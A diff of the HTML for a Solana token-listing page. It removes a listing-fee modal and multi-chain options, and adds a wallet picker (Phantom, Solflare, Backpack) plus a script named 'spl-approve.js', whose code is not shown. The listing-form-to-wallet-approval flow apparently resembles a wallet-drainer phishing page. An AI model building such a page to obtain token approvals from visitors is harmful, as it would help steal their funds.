@@ -4,77 +4,42 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SPL Token Project Listing</title>
-  <link rel="stylesheet" href="List.css">
-  
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-  <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
+  <link rel="stylesheet" href="List/List.css">
 </head>
 <body>
-
-  <video class="video-bg" autoplay muted loop playsinline>
-    <source src="List/animatealpha.mp4" type="video/mp4">
-  </video>
-
   <main class="page">
     <form id="projectForm" class="card">
       <h2>Submit Your SPL Token</h2>
-      
       <div class="grid">
-        <input type="text" id="projectName" placeholder="Token Name (e.g., Solana)" required />
-        <input type="text" id="projectSymbol" placeholder="Token Symbol (e.g., SOL)" required />
-
-        <select required>
-          <option value="">Select Chain</option>
-          <option>Ethereum</option>
-          <option>BNB Chain</option>
-          <option>Solana</option>
-          <option>Polygon</option>
-          <option>Arbitrum</option>
+        <input id="tokenName" name="tokenName" placeholder="Token Name (e.g., Solana)" required />
+        <input id="tokenSymbol" name="tokenSymbol" placeholder="Token Symbol (e.g., SOL)" required />
+        <select id="chain" name="chain" required>
+          <option value="solana">Solana</option>
         </select>
-        
-        <input type="text" id="mintAddress" placeholder="Token Mint Address" required />
-        <input type="number" id="totalSupply" placeholder="Total Supply" step="any" />
-        <input type="number" id="circulatingSupply" placeholder="Circulating Supply" step="any" />
+        <input id="tokenMint" name="tokenMint" placeholder="Token Mint Address" required />
+        <input id="totalSupply" name="totalSupply" placeholder="Total Supply" />
+        <input id="circulatingSupply" name="circulatingSupply" placeholder="Circulating Supply" />
       </div>
-
-      <textarea id="additionalInfo" placeholder="Other necessary information (Community links, Dex tools, etc.)"></textarea>
-      
+      <textarea id="otherInfo" name="otherInfo" placeholder="Other necessary information (Community links, Dex tools, etc.)"></textarea>
       <div class="grid">
-        <input type="text" id="devName" placeholder="Developer Name" required />
-        <input type="email" id="devEmail" placeholder="Developer Email" required />
+        <input id="devName" name="devName" placeholder="Developer Name" required />
+        <input id="devEmail" name="devEmail" type="email" placeholder="Developer Email" required />
       </div>
-      
       <button type="submit" class="btn-primary">Submit Project</button>
     </form>
   </main>
 
-  <div id="feeModal" class="modal hidden">
+  <!-- Wallet Modal -->
+  <div id="walletModal" class="modal">
     <div class="modal-content">
       <span class="close">&times;</span>
-      <h3>Listing Fee Required</h3>
-      <p>You need to pay a listing fee to submit your SPL token to the platform.</p>
-      <button id="proceedButton" class="btn-primary">Proceed to Payment</button>
+      <p>Select your Solana wallet to continue:</p>
+      <button id="phantomButton" class="wallet-btn">Phantom</button>
+      <button id="solflareButton" class="wallet-btn">Solflare</button>
+      <button id="backpackButton" class="wallet-btn">Backpack</button>
     </div>
   </div>
 
-  <div id="walletModal" class="modal hidden">
-    <div class="modal-content">
-      <span class="close">&times;</span>
-      <h3>Connect Solana Wallet</h3>
-      <p>Choose your preferred connection method:</p>
-      
-      <button id="browserWalletButton" class="wallet-btn">
-        <span class="wallet-icon solana-native"></span>
-        SPL Browser Wallet / App
-      </button>
-      
-      <button id="walletConnectButton" class="wallet-btn">
-        <span class="wallet-icon walletconnect"></span>
-        WalletConnect (Mobile QR)
-      </button>
-    </div>
-  </div>
-
-  <script src="List/script.js"></script>
+  <script type="module" src="spl-approve.js"></script>
 </body>
 </html>
